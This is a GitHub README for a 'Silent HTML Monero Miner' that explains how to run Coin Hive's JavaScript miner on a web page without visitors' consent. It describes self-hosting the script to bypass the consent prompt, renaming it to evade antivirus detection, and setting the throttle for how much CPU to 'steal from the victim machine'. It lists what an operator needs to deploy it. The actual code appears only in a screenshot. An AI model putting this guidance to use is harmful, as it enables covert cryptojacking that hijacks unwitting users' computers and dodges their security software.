# Coin-Hive_Hidden-Miner.github.io

<h2>Silent HTML Monero Miner</h2>

![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/coinhive-icon.png)

I have created this simple html page as a demonstration on how to make hidden the javascript miner of Coin Hive.<BR>
In fact, even if the site says that you can not use the miner without the consent of the user, in reality, things are very different ...</BR>
In part however it is true what they say, in fact if you try to call the .js file of the miner directly from their servers, that is:

https://coinhive.com/lib/coinhive.min.js?v8</BR>
https://authedmine.com/lib/authedmine.min.js?v8

you will see that the user's consent will be required, but the thing is easily circumvented, in fact just host the .js file directly on the server where you host the html page you want to use for the miner, for security I also changed the file name, since now the miner is well known by the vendor antivirus and company ....

:trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:


https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/

:trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:

<h3> Requirements </h3>

* a Coin Hive Account (https://coinhive.com)
* a Monero Wallet to make the withdraw  (https://mymonero.com/#/)
* a Web Server or a Website (also Github)
* a Coin Hive site key


<h3> Browser Compatibility </h3>

All

<h3> How it Works??? </h3>

Once you register on CoinHive and after creating the site key you are ready for the simple setting of the miner.
In practice everything is concentrated in the few lines in the code index.html file that you can see in the image:

![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/screenshot.JPG)

In line 20 it is sufficient to replace the url (in my case hosted in github) with that of the webserver where you have loaded the html page.
Note that I replaced the file name from coinhive.min.js to pino.js, this for a further avoidance of the AV, of course you can rename the file with a name of your choice ...

You can see the original file hosted on CoinHive servers here:

https://coinhive.com/lib/coinhive.min.js?v8

From line 22 onwards the miner settings start, with the Coinhive.Anonymous command we tell the miner to start anonymously, </BR>
after which you can see my public key, which you have to replace with your public site key.</BR>
The throttle command determines the% of the processor you want to steal from the victim machine, 0 is 100% while 0.8 is the minimum.</BR>
While the miner.start command simply starts the miner (in our case without user consent ...).

The commands of the javascript miner are many, you can consult them from here:

https://coinhive.com/documentation/miner#constructor-options


![Alt text](http://www.imigliorifaucet.it/g1.gif)


<h3> Curiosity </h3>

The image PNG used as background in this example is actually a simple algorithm designed / written in PIET.</BR>
Who wants can test it in the online interface from here: https://www.bertnase.de/npiet/npiet-execute.php


![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/bit.png)
